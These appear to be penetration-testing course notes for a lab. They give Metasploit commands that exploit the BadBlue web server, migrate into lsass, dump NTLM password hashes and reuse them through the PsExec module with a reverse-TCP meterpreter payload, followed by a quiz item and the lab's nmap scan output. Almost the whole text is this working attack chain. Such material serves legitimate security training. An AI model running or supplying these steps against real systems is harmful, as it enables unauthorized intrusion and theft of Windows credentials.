
- Authenticate with stolen clear text password
- Authenticate with legitimate creds


Setup msfconsole
```
service postgresql start && msfconsole
workspace -a PsExec 
setg RHOST <target_ip>
```

Setup module 
```
search badblue 
use exploit/windows/http/badblue_passthru
set target <bad_blue_version>
exploit
```

Dump hashes by migrating to system prcoess lsass
```
pgrep lsass
migrate <process_id>
hashdump
```

Use credentials to authenticate with PsExec
```
search psexec
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
options
set SMBUser Administrator
set SMBPass <smb_hash>
exploit
```

## Quiz

Which one of the following meterpreter commands can be used to dump NTLM hashes?

	hashdump
## Lab

```
10.4.20.171

```

```
db_nmap -sV -O  10.4.20.171

[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services

```